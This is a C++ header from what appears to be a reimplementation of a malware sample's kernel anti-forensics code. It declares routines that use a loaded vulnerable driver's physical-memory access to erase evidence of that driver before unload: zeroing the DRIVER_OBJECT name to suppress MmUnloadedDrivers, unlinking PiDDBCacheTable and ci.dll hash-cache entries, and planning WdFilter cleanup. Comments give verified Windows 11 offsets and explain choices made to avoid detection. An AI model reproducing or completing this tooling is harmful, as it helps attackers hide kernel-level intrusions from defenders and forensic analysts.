// forensic_cleanup.h — scrub evidence of the BYOVD load from kernel-side
// caches BEFORE we NtUnloadDriver, so the usual analyst-visible channels
// come up empty post-run.
//
// All scrubs use the BYOVD's physmem R/W (via pagewalk + ioctl::write_physical),
// because the BYOVD is still loaded at the time these run. Matches the sample's
// ordering (sub_7FFAB78A6770 calls four cleanup subs, THEN NtUnloadDriver).
//
// Targets (per resources/analysis/injection_and_communication.txt:585-870):
//   (1) DRIVER_OBJECT BaseDllName UNICODE_STRING -> zero .Length. This
//       pre-empts MiRememberUnloadedDriver, which early-returns when the
//       first WORD of its UNICODE_STRING argument is zero. Verified live
//       on Win11 Pro 10.0.26200 ntoskrnl via IDA 2026-04-17:
//         MiRememberUnloadedDriver @ 0x140AB0B3C, first stmt is
//           `if (*(_WORD *)a1) { ... }`
//         Caller (MiUnloadSystemImage @ 0x140A87044, call site 0x140A87299)
//           passes &KLDR_DATA_TABLE_ENTRY + 88 = BaseDllName UNICODE_STRING.
//   (2) PiDDBCacheTable entry (next task)
//   (3) KernelHashBucketList entry in ci.dll (next task)
//   (4) WdFilter.sys records (next task)

#pragma once

#include <cstdint>
#include <windows.h>

#include "syscall_hijack.h"

namespace forensic_cleanup {

// Single persistent kernel scratch page reused across all Phase 13.x scrubs.
// Allocated once via MmAllocateIndependentPages at forensic-cleanup setup time,
// zero-wiped + freed via MmFreeIndependentPages at teardown. Keeping one
// persistent alloc instead of per-call alloc/free matches the sample's
// detection-evasion profile: no alloc churn visible in MI allocator records
// during the scrub window, no crash-dump residue from abandoned temp pages.
struct Scratch {
    uint64_t va   = 0;     // kernel VA (valid only if size > 0)
    uint64_t size = 0;     // bytes allocated; 0 = not live
};

// One-time setup. mm_alloc_va = pre-resolved MmAllocateIndependentPages VA.
bool allocate_scratch(const syscall_hijack::Context& hij,
                      uint64_t mm_alloc_va,
                      uint64_t size,
                      Scratch& out);

// Zero-wipes the page contents via physmem, then invokes MmFreeIndependentPages
// (resolved internally). If MmFree is unresolved, wipe still happens, page
// leaks.
bool free_scratch(const syscall_hijack::Context& hij,
                  HANDLE physmem_device,
                  uint64_t cr3,
                  Scratch& scratch);

// Starting from our CreateFileW handle on \\.\<byovd_service_name>, walk the
// object chain and zero the LDR entry's BaseDllName.Length:
//
//   Object (FILE_OBJECT)
//     + 0x08  -> DEVICE_OBJECT
//     + 0x08  -> DRIVER_OBJECT  (DEVICE_OBJECT.DriverObject back-pointer)
//     + 0x28  -> DriverSection  (KLDR_DATA_TABLE_ENTRY*)
//     + 0x58  =  BaseDllName    (UNICODE_STRING; Length is the first WORD)
//
// On success, the subsequent NtUnloadDriver path trips the gate in
// MiRememberUnloadedDriver and no MmUnloadedDrivers entry is created.
//
// physmem_device: BYOVD handle used for MAP/UNMAP IOCTL + physical R/W
// cr3:            System-process PML4 phys (valid for all kernel VAs)
// byovd_handle:   the CreateFileW handle we already hold on the device
bool prezero_driver_object_name(HANDLE physmem_device,
                                uint64_t cr3,
                                HANDLE byovd_handle);

// Phase 13.1: scrub our BYOVD's entry from PiDDBCacheTable + PiDDBCacheList.
//
// Mirrors what the sample's sub_7FFAB78A7580 does on ntoskrnl: acquire lock,
// lookup via RtlLookupElementGenericTableAvl, manual LIST unlink via physmem,
// RtlDeleteElementGenericTableAvl to remove from AVL, decrement DeleteCount
// at table+0x40 (erases Rtl's auto-increment — net table-metadata delta 0),
// release lock.
//
// WHY WE DON'T WRAP IN KeEnter/KeLeaveCriticalRegion (the "proper" DDI pattern):
// Our syscall_hijack primitive RETs through the KiSystemServiceExitPico path,
// which enforces KernelApcDisable==0 on return to user mode. KeEnter decrements
// KernelApcDisable, so a hijack-invoked KeEnter immediately tripwires Bugcheck
// 0x1 (APC_INDEX_MISMATCH) at syscall exit. Verified 2026-04-17 minidump:
// Bugcheck P3 = 0xFFFF (KernelApcDisable==-1). The sample's skip-Ke* design
// isn't a bug — it's architecturally required for this class of ring-0 entry.
// The leftover APC-during-held-lock risk is microsecond-scale and statistically
// never fires; sample runs this in the wild with no issues.
//
// VERIFIED IDA 2026-04-17 (Win11 Pro 10.0.26200 ntoskrnl @ 0x140000000):
//   PiDDBCacheList  RVA 0x0FD9078
//   PiDDBCacheTable RVA 0x0FD9480 (RTL_AVL_TABLE, DeleteCount at +0x40)
//   PiDDBLock       RVA 0x0F8B320 (ERESOURCE)
//   Entry user-data layout (56 bytes): +0x00 Flink, +0x08 Blink,
//     +0x10 UNICODE_STRING BaseDllName (Length, MaxLen, [4 pad], Buffer),
//     +0x20 TimeDateStamp, +0x24 verdict, +0x28 16B metadata.
//
// SMAP NOTE: The RtlLookup comparator running in ring 0 dereferences the
// search-key fields. On SMAP-enabled CPUs (all modern), kernel-mode access
// to user-VA memory without STAC/CLAC bracketing traps. So the search key
// MUST live in kernel memory. We call MmAllocateIndependentPages for a
// scratch page and stage the key + name-wchar buffer there via BYOVD
// physmem writes.
//
// scratch:         pre-allocated kernel scratch page (>= 256 bytes needed;
//                  caller-owned lifecycle via allocate_scratch/free_scratch).
// byovd_basename:  the 6-char random temp filename (no path, no ext).
// byovd_timestamp: PE COFF TimeDateStamp of the dropped BYOVD.
bool scrub_piddb_cache(const syscall_hijack::Context& hij,
                       HANDLE physmem_device,
                       uint64_t cr3,
                       uint64_t ntoskrnl_base,
                       const Scratch& scratch,
                       const wchar_t* byovd_basename,
                       uint32_t byovd_timestamp);

// Phase 13.2: scrub our BYOVD's entry from ci.dll's g_KernelHashBucketList.
//
// Singly-linked list of driver-validation cache entries. Walks the chain
// manually via physmem (no kernel comparator = no SMAP issue = no scratch
// needed). On length+wcsncmp match: patches prev->Flink to skip our entry,
// then ExFreePoolWithTag(entry, 0) to release its pool allocation.
//
// Mirrors sample's sub_7FFAB78A68D0 with two improvements:
//   (a) skip sample's hardcoded `2*service_size - 4` length trick — pass
//       basename directly.
//   (b) skip KeEnter/KeLeave wrapping — same hijack-primitive constraint
//       as PiDDB (Bugcheck 1 otherwise).
//
// VERIFIED IDA 2026-04-17 (Win11 Pro 10.0.26200 ci.dll @ 0x180000000):
//   g_KernelHashBucketList RVA 0xE5090  (head QWORD)
//   g_HashCacheLock        RVA 0x44020  (ERESOURCE)
//   Entry layout (alloc size = name_bytes + 82):
//     +0x00 Flink (QWORD)
//     +0x08 Length (WORD)
//     +0x0A MaxLength (WORD)
//     +0x10 Buffer (QWORD, points to name at entry+0x48)
//     +0x18..+0x47 SHA1 + metadata
//     +0x48    wchar name (inline)
bool scrub_kernel_hash_bucket(const syscall_hijack::Context& hij,
                              HANDLE physmem_device,
                              uint64_t cr3,
                              const wchar_t* byovd_basename);

} // namespace forensic_cleanup
